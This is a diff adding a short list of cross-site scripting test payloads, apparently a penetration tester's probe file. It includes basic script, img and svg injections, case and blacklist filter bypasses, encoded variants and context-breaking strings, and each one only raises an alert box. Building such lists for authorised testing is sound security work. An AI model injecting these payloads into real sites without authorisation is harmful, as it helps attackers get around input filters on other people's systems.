@@ -1,0 +1,26 @@
+# Basic Payloads (using img, svg)
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+
+# Bypassing Case Filters 
+<ScRiPt>alert('XSS')</ScRiPt>
+<IMG SRC=X ONERROR=alert('XSS')>
+
+# Bypassing Attribute/Tag Blacklisting 
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<iframe src="javascript:alert('XSS')">
+
+# Using Encodings
+%3Cscript%3Ealert('XSS')%3C/script%3E
+&#60;script&#62;alert('XSS')&#60;/script&#62;
+
+# Testing for Context (inside HTML tag, inside JS string, etc.)
+" onmouseover="alert('XSS')
+';alert('XSS');//
+</script><script>alert('XSS')</script>
+
+# DOM-based Payloads
+# These are used in URL parameters, not in POST bodies
+javascript:alert('XSS')
